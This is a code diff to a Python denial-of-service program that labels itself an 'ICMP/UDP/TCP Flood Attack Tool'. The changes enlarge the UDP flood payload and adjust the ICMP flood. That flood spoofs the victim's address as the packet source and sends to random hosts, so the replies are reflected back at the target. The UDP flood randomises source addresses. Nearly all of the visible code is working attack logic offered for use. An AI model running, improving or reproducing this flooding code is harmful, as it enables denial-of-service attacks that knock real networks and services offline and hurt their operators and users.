@@ -5,7 +5,7 @@ from argparse import ArgumentParser
 import threading
 import time
 
-data = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
 # ICMP/UDP/TCP Flood Attack Tool
 def main():
     print("______  _                    _     ___   _    _                 _      _____                 _ ")
@@ -104,6 +104,7 @@ def HTTPFlood(dstIP,dstPort,repeat):
             print("-"*35 + "Error Occured during Sending packets"+35*"-"+"\n")
 
 def UDPFlood(dstIP,dstPort,repeat):
+    data = "A"*1250
     for x in range(repeat):
         IP_Packet = IP()
         IP_Packet.src = randomSrcIP()
@@ -119,8 +120,9 @@ def ICMPFlood(dstIP,dstPort,repeat):
         IP_Packet = IP()
         IP_Packet.src = dstIP
         IP_Packet.dst = randomSrcIP()
-        IP_Packet.proto='icmp'
         ICMP_Packet = ICMP()
-        send(IP_Packet/ICMP())
+        send(IP_Packet/ICMP(),verbose=False)
+    print("-"*35 + "ICMP Packet is Successfuly sended"+35*"-"+"\n")
+
 
 main()
